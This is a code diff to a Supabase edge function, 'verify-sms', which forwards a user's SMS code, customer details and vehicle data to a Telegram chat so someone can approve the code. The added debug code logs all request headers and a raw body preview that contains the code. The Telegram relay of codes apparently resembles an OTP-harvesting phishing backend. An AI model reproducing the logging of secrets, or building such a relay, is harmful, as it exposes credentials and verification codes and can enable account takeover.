@@ -23,9 +23,22 @@ serve(async (req) => {
       Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
     );
 
-    const { userId, code, customerInfo, vehicle, duration } = await req.json();
+    const raw = await req.text();
+    console.log('[verify-sms] incoming request meta:', {
+      method: req.method,
+      headers: Object.fromEntries(req.headers.entries()),
+      rawBodyLength: raw?.length ?? 0,
+      rawPreview: raw?.slice(0, 200)
+    });
 
-    console.log('SMS verification request:', { userId, code, customerInfo: customerInfo?.fullName });
+    let parsed: any = null;
+    try {
+      parsed = raw ? JSON.parse(raw) : null;
+    } catch (e) {
+      console.error('[verify-sms] JSON parse error:', e);
+    }
+
+    const { userId, code, customerInfo, vehicle, duration } = parsed || {};
 
     if (!userId || !code || !customerInfo || !vehicle || !duration) {
       return new Response(
@@ -117,7 +130,7 @@ Please verify if this code is correct:`;
       body: JSON.stringify({
         chat_id: telegramSettings.form_chat_id,
         text: message,
-        parse_mode: 'Markdown',
+        // No parse_mode: send as plain text to avoid entity parsing errors
         reply_markup: keyboard
       }),
     });
